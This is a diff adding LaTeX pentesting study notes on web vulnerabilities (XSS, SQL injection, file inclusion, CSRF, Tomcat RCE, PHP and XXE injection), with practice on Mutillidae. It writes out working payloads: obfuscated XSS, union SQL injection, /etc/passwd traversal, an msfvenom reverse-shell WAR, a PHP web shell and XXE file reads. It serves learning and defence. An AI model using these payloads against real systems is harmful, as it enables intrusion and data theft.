@@ -1,0 +1,355 @@
+
+\section{Top Web and Application vulnerabilities}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{XSS} XSS is known as Cross Site Scripting.
+XSS is all about embeeding unneded code within website.
+If application stores any kind of user input and shows this input to the user or allows you to store any kind of data within html, there is always risk that XSS can be done over the website.
+
+\paragraph{Hint} Sometimes you might need double encoding in your injection attacks.
+You will use hexagonal system.
+So for example you might want to use \q{\textbackslash} but it is encoded to \q{\%5c} so instead of \q{\textbackslash} you write: \q{\%255c} since \q{\%} is encoded as \q{\%25}.
+So \q{\%255c} yields double encoded \q{\textbackslash}.
+\subsubsection{Reflected} Injected code is used only once (it can be used many times indeed but is always used in time of sending it, copying, pasting, reloading the page etc).
+For example if your application uses somehow show the data passed through CGI to the end user (e.g. embeeds CGI parameters inside html) attack can be performed by passing invalid URL: \texttt{http://application.com/search.php?title=<script>action()</script>}.
+Another technique is to pass mailicious code after \# hash in URL: \texttt{}.
+\subsubsection{Stored}  Code is stored and is ran every time page is being ran.
+In such case there are thousands of scenarios.
+If you find an input that does not validate JavaScript as plain text but as code you won.
+Below are mentioned some input data (payloads) you may inject as JavaScript code.\newline
+
+\q{Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>} is embeeding scripting in another tag.
+
+
+Payloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and evaluated: \newline
+\q{<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>} \newline
+
+\paragraph{Hint} \q{\&lt;} and \q{\&gt;} are used for \q{<} and \q{>} respectively in encoding convention.\newline
+
+\q{<body onload="javascript:alert()"} - using event to trigger scripting.\newline
+
+\q{<link rel="stylesheet" href="javascript:alert()"} - using dynamic href links.\newline
+
+\q{<img src="jav\&\#x0D;ascript:alert()"} - embedding carriage returns.\newline
+
+\q{');alert();//} - when devs use java script to echo data using \q{document.write}.\newline
+
+
+\subsubsection{DOM-based} Could be considered as refelected XSS. Injected script is located on client side (for instance: data stored after \# in URL (www.site.com/index.php\#<script></script>) is not transmitted to the server - it stays locally on client side or in DOM)-DOM-based XSS does not reach the server.
+DOM-baset XSS payload can be injected inside html events like follows: \texttt{<input type="button" name="button" onmouseover="javascript:document.action()">}.
+In example above custom function action() is executed when moving mouse coursor over the button.
+There are many attributes like: \texttt{onload, onclick} etc.
+In another case javascript script path can be embeeded as path to image like follows:
+\texttt{<IMG source="javascript:<path\_to\_the\_script>"}.
+In this example source can be either javascript script itself or just path to script located somewhere in the internet or locally.
+It means that source could become:
+\texttt{...source="http://magicsctipts.end/magicalscript.js"}
+Or or instance: \q{<img src=javascript:alert(1)>}.
+But remember that usually you inject the code so it should like: \q{"><img src=javascript:alert(1)>}.
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsubsection{BeEF} Beef is a tool for conducting XSS attacks.
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Injections}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   SQL
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsubsection{SQL injection}
+Let's imagine there is an user input in the application or on the web page that allows end user to interact with database.
+SQL injection appears when
+user input data is not properly validated and sanitized and input provided by user can be threated by database engine as a part of SQL syntax.
+If mentioned input is login and password the simple example SQL syntax could look like:
+\newline
+\texttt{SELECT * FROM users WHERE login='<user input login>' and password='<user input password>'}
+\newline
+If input is not properly secured simple SQL injection could take place while providing the phrase between quotes "":\texttt{"' OR 1=1 -- "}.
+This phrase within the entire query will look like:
+\newline
+\texttt{SELECT * FROM users WHERE login='' OR 1=1 -- ' and password='<user input password>'}
+So it does not matter what password we provided since is was commented out by "-- " which comments out queries in SQL syntax.
+Remember that after "-- " one space is present.
+In mentioned query "1=1" statement always recives TRUE so the whole query is executed.
+Obviously before commenting out the password input we could finish this query and start another one with different function (in this query we deal with SELECT FROM function).
+
+Below are mentioned anothed SQL payloads for injection you might use.
+\paragraph{via GET} \q{../user-account.php?username=jeremy'+union+select+<column\_name>+from+accounts+--+}
+\paragraph{get schema metadata info (MySql)} \q{../user-account.php?username=jeremy'+union+select+table\_name+from+information\_schema.tables+--+}
+If you somehow meet the error that number of columns is not equal it means that number of columns in original query and number of columns in injected query are different.
+To sort it out add as much columns in injected query as you need.
+In the following example we had to add 3 columns (null,null,null).
+\paragraph{get schema metadata info (MySql)} \q{../user-account.php?username=jeremy'+union+select+table\_name,null,null,null+from+information\_schema.tables+--+}
+
+There are few methods protecting against SQL injection.
+First of all we should sanitize the input.
+Sanitization is the process of removing all SQL, JS, PHP etc syntax special characters from user input.
+Example below shows the example PHP validation and sanitisation functions:
+\newline
+\newline
+\texttt{\$sanitzeEmail = filter\_var(\$emailToValidate, FILTER\_SANITIZE\_EMAIL);}
+\newline
+\texttt{\$validateEmail = filter\_var(\$emailToValidate, FILTER\_VALIDATE\_EMAIL);}
+\newline
+
+On the other hand if we do not want to block user to use special characters we should use Parametrized Queries and Prepared Statements.
+While using parmetrised queries we do not send query directly to database.
+Instead of it we send query with parameter placed at input variable place, and in the next step we send user input to the parameter.
+In whis approach we tell database what functions query consists of but we also say that everything that comes after query and points the given parameter should be treated as plane text, not as SQL syntax.
+In PHP it could be done by:
+\newline
+\newline
+\texttt{\$statement=\$pdo->prepare(SELECT * FROM emplyees WHERE name = :name');}
+\newline
+\texttt{\$statement=\$pdo->execute(array('name'=>\$name));}
+\newline
+
+In this example \texttt{\$statement} is our PHP variable  which is being prepared in memory and waits for execution.
+It means it waits for \texttt{\$name} variable which usually comes via POST method. \texttt{\$pdo} here is an instance of PDO (PDO Data Objects) library.
+
+SQL injection can be conducted from many points of view.
+The potential targets are: CGI parameters, input forms, HTTP request headers.
+
+
+\paragraph{SQL map} is Kali tool that allows to automate sql injection.
+When using sqlmap obligatory parameters are these pointing at the target e.g \texttt{u,r}.
+In url providing scenario you must use the following syntax: \texttt{sqlmap -u http://examplesite.pl/index.php?id=1}
+\newline
+This is important to ensure get parameters in url in this case.
+If you are dealing with different scenario (e.g. POST method) you can intercept the request in Burb and copy it to \texttt{example.request} file (you create this file somwhere in the system).
+Then you can use this request file and pass it in sqlmap by \texttt{-r} flag: \newline
+\texttt{sqlmap -r "../../example.request"}
+\paragraph{Practise with Mutillidae}
+In this example you can practise sqlmap in Mutillidae.
+Go to userinfo page.
+Choose  any kind of user, send request and intercept it in Burb.
+Save request as file.request and pass it in sqlmap.
+You should see that at least "username" parameter is injectible.
+Usually it it better to sent only request rather than url because it decreases mistakes and mismatches.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   IDOR
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{IDOR - Insecure Direct Object References}
+
+\subsubsection{Local File Inclusion} It includes local files on webpage.
+Always when your application deals with including files you can consider both local and remote file inclusion.
+You must find the place where files are appended od included somehow.
+You must replace file directory with some local directory where files you want to include are present.
+In this scenario you can use only files from local machine that user is working on.
+\paragraph{Practice with Mutillidae}
+In this Example we will include passwords file from local machine using Mutillidae.
+Go to Mutillidae and find Insecure Direct Object Reference section.
+Turn on Burb and interception on.
+Choose file in selector and request uploading.
+Go to Burp and change \texttt{textfile} attribute by replacing txt file directory by (using path traversal) \texttt{../../../../../../../../../../../etc/passwd}.
+Everything should look like: \texttt{textfile=../../../../../../../../../../etc/passwd\&text-file-viewer-php-sumbit-button=View+file}.
+The most important part in here is first one where by traversaling the path we are getting text file from /etc/passwd. \texttt{textfile} in here is POST attribute.
+Obviously we could replace original directory by any other one where even PHP code is included.
+
+\subsubsection{Remote File Inclusion} As name says for its own it includes files remotely.
+It can include file and upload it to server.
+This is critical vulnerability because mailicious user can remotly control server files and in the worst scenario control server shell.
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   XSRF
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{XSRF - Cross Site Request Forgery}
+This vulnerabilities base on the idea that for instance cookies are stored locally and transferred between sites which gives good user experience because users do not need to login every time on website.
+Logging process is realized by cookie verification.
+It means that if you logged somewhere and your cookie is stored - you are verified user.
+Information that you are veirfied could be used to perform dangerous actions.
+
+\paragraph{Money transfer example} Lets consider situation when you are transfering money from your account to another one.
+You logged into the bank account and secured (in terms of probability) cookie has been stored locally on your machine.
+While transfering money you technicaly send GET or POST request.
+Your bank server recives your request from website, verifies cookie and transfers money.
+Example GET request could look like: \\
+\texttt{http://bank.com/transfers?amount=1000\&account=3789987123789123}. \\
+It could be also realized by POST method but for now GET gives clear approach.
+Now, lets consider that attacker somehow invites you to his site.
+On the site the following html code is hidden: \\
+\texttt{<img source="http://bank.com/transfers?amount=1000\&account=attackers\_account\_number">}\\
+So attacker replaced the account number with his number.
+When you enter the page your browser loads all content including this img.
+Request for img is sent by GET method but is not the img course but just money transfer which is confirmed by cookie stored on your machine.\\
+
+Situation from the example is very simple but in real life attacker could lead you through his website simultaneously collecting data about you and afterwards convince you to click some button to send your request.
+Real button could really be the real one - it could transfer you to trusted site but there could be another dangerous button, hidden below with smaller z-index. \\\\
+Application APIs should be designed in the way that GET performs no changes on the server side.
+GET method should only be used for navigation or downloading content.
+\paragraph{Attack details}
+\paragraph{Defence} In order to defend from that attack we could introduce second step of verification.
+Banking applications are used to use SMS codes or captcha.
+We can also introduce unique form tokens generated on every POST, PUT or DELETE request.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   REMOTE CODE EXECUTION
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Remote Code Execution (RCE)}
+Remote code execution takes place when you are able to execute for instance shell commands on the remote machine.
+It can happen when you upload script file to the web page (javascript) which is executed or when you
+upload script files on the server and these are interpreted and executed as normal secure code.
+In this scenario you can upload a piece of software that executes shell commands and sends them back from the remote mashine to you.
+In general you can work on remote terminal as it was located on your machine.
+\paragraph{Tomcat Java servlet upload}
+In this example I describe how remote code execution is done basing on servlet upload on tomcat server.
+Lets consider tomcat server works on 10.10.10.10:8080 port (we know this from nmap).
+We also know from nmap that operating system is Windows x65
+Now we enumerate tomcat users using \texttt{auxiliary/scanner/http/tomcat\_mgr\_login}.
+Lets assume enumeration gives: \texttt{tomcat:tomcat}.
+Once the tomcat user is logged in go to place when WAR files are uploaded.
+Make payload using \texttt{msfvenom -p windows/x64/shell/reverse\_tcp lhost\=192.168.1.4 -f war>tom.war} (\texttt{-f war} stands for format of input file and \texttt{lhost} is our host).
+If war file has been compiled you can check what is inside by: \texttt{jar tvf <file-name>.war}.
+There is file with .jsp extension and this file will execute shell and transmit it to our listener.
+Now upload .war file on the server and run in the msfconsole \texttt{multi/handler}.
+Multi-handling listener will run in terminal and will be wating for connections coming from remote machine.
+Last step is to go to \texttt{http://10.10.10.10:8080/...../<war-file-name>/<jsp-file-name>.jsp}.
+Finally you should see remote terminal and execute commands remotely.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   BUFFER OVERFLOW
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Buffer Overflow}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   PHP SCRIPT INJECTIONB
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{PHP script injection}
+\label{subsec:phpinjection}
+Some websites allows users to upload content other than text e.g photos, movies, games and many other odd file formats.
+While it is not properly controlles what type is being saved user is able to embeed PHP code which will be executed every time while trying to "see" uploaded content.
+The vulnerability here is the remote shell execution.
+PHP code which executes shell is simple : \texttt{echo shell\_exec(<shell script>);}, where shell script is the one executed by shell on local server.
+In order to run the script you should find possibility to embeed the following script on the html page: \texttt{<?php echo shell\_exec(\$\_GET['variable']); ?>}.
+In this scenario every time you open the page you added  the code to
+you will be able to send shell commands remotely by passing them as GET variable via URI.
+
+\paragraph{Hint} Check your PHP file type by \texttt{file filename.php} (see \ref{subsubsec:file}).
+Add \texttt{GIF8;} or \q{GIF87a} or \q{GIF89a} line as first line in your PHP file.
+Check again.
+\q{7a} as well as \q{9a} describes version.
+
+\paragraph{Hint} In you would like to check if some point is vulnerable to php injection you can submit the following line \q{include("<?php echo "ohdear" ?>")}
+The \q{include()} method literally includes a PHP script to your code so it is executes as it was part of php code.
+
+Another point of injecting PHP code might be via PNG file injection.
+In that case you might try set up \q{-DocumentName} parameter by using \q{exiftool} (see \ref{subsubsec:exiftool}).
+In that scenario you would inject a PHP code into the parameter like follows:  \newline
+\q{exiftool  -DocumentName="<?php phpinfo() \_\_halt\_compiler(); ?>" ../../../blablaimage.png} \newline
+Where \q{\_\_halt\_compiler()} halts the execution of the compiler.
+This can be useful to embed data in PHP scripts, like the installation files.
+
+
+Check if parameter is set up: \q{exiftool ../../../blablaimage.png}.
+After hitting the uploaded blablaimage.png you should see phpinfo page.
+It might help you.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   XXE - XML EXTERNAL ENTITY INJECTION
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{XXE - External Entity Injection}
+The ENTITY statement is used to define entities in the DTD (Document Type Definition), for use in both the XML document associated with the DTD and the DTD itself.
+An ENTITY provides an abbreviated entry to place in your XML document.
+The abbreviated name is what you provide for the name parameter.
+General sysntax for entities is: \newline
+\q{<!ENTITY [\%] name [SYSTEM|PUBLIC publicID] resource [NDATA notation] >} \newline
+This XXE kind of injection is when we are dealing with input that is included in some ways into XML file.
+It might be configuration file (for instance tomcat configuration file) or other XML file.
+This situation might appear when some SOAP requests are made and input is not validated.
+Attempt to inject XML or reserved characters into input parameters and observe if XML parsing errors are generated.
+Once you found point where XML can be injected you can try playing with it (with Burp for example).
+In the simplest way you can always try is "helloworld" as \q{<message>HeyJude</message>} or \q{<user role="admin">bir</user>}.
+On the other hand you might try injecting JavaScript into XML as: \q{<element><![CDATA[<p><script>alert()</script></p>]]></element>}
+Where you should always write your JavaScript inside \q{[CDATA[<html\_or\_js\_goes\_here>]]}.
+Obviously there are many methods on injecting XML entities, let's have a look on more detailed and sophisticated payloads.\newline
+\paragraph{robots.txt}
+Most sites have included robots.txt file in main directory.
+Web site owners use the /robots.txt file to give instructions about their site to web robots - this is called The Robots Exclusion Protocol.
+This file states for instance what directories are allowed to be crawled and what are not.
+
+In an external entity attack, XML is injected or uploaded to the site in an effort to get the XML parser import the injected entity into the XML, then output the contents of the entity.
+Let's look at the payload: \newline  \q{
+<?xml version="1.0"?> \newline
+<!DOCTYPE change-log [ \newline
+<!ENTITY systemEntity SYSTEM "robots.txt"> \newline
+]> \newline
+<change-log> \newline
+<text>\&systemEntity;</text> \newline
+</change-log> \newline
+}
+In this case we begin with entity declatarion \q{!ENTITY} and give it the name \q{systemEntity}.
+The type of entity is \q{SYSTEM} which means local (operating) system.
+The path to local system file we would like to fetch is \q{/robots.txt}.
+By tag \q{<change-log></change-log>} we embed the the robots.txt by \q{\&systemEntity} - this is a substitution.
+In simple words: XML parser look up for the \q{systemEntity} SYSTEM variable, gabs the content of the file and substitutes the \q{\&systemEntity} entity declaration.
+
+
+It is external entity because robots.txt is not a part of XML file.
+On the other hand if there is no robot.txt file you might try something else including path traversaling.
+For windows you may try \q{"../../../../../../boot.ini"} or classic \q{"../../../../../../etc/passwd"} - for FUN.
+So for Linux distros try the following payload: \newline
+
+\q{<?xml version="1.0" standalone="no" ?> \newline
+<!DOCTYPE demo [<!ELEMENT demo (\#PCDATA)> \newline
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]> \newline
+<a>\newline
+<inject>\&xxe;</inject>\newline
+</a>\newline}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   JSON injection
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\newpage
+\subsection{JSON injection}
+If page uses JSON to pass data which is later parsed and incorporated into the page and output is not properly encoded, it is possible to carefully craft an injection which will add extra data into the JSON without breaking the JSON syntax.
+This extra data will be executed by the browser once the data is incorporated into the page.
+Remember that there is no recipe how to inject the data.
+Since you are injecting data to JSON file injection depends on file structure, number and type of nodes etc.
+\paragraph{Example}
+Let's consider mutillidae JSON injection (pen-test-tool-lookup-ajax.php).
+In this example we choose some variables and asynchronous call is made by JavaScript in the background.
+Page is being updated with data with chosen variable (in that case some pentesting tools).
+Intercepted response body look like: \newline
+\{\newline
+"query": \{\newline
+"toolIDRequested": "1",\newline
+"penTestTools": [\{\newline
+"tool\_id": "1",\newline
+"tool\_name": "WebSecurify",\newline
+"phase\_to\_use": "Discovery",\newline
+"tool\_type": "Scanner",\newline
+"comment": "Can capture screenshots automatically"\newline
+\}]\}\}
+
+In that case we want to inject JavaScript code into that body and it will be executed on website.
+When intercepting the request we find \q{ToolID} post variable, so we guess that will be the point of injecting the javascript code.
+The hint here is that you should always use some kind of javascript text editor with formatter so when you type you hypothesis about injection it is clearly visible how the response body will be looking like.
+We also see that requested \q{ToolID} is the same parameter as \q{toolIDRequested} in the response body, so the guess is: we put injected code here and it will appear in the response body and will be incorporated into the source code,
+The solution here is that we must put \q{1"\}\});alert();//} here in order to properly inejct the JS code.
+I guess all symbols orgins here are understandable except ")".
+The tricky part here is that parenthesis here must appear because the whole response body afterwards will be sent directly to some \q{function()} inside \q{<script><\/script>} and since we are uncommenting last part after the semicolon we must ensure that function is properly closed.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%   Oauth capturing
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{OAuth capturing}
+
+\subsection{Buffer Overflow}
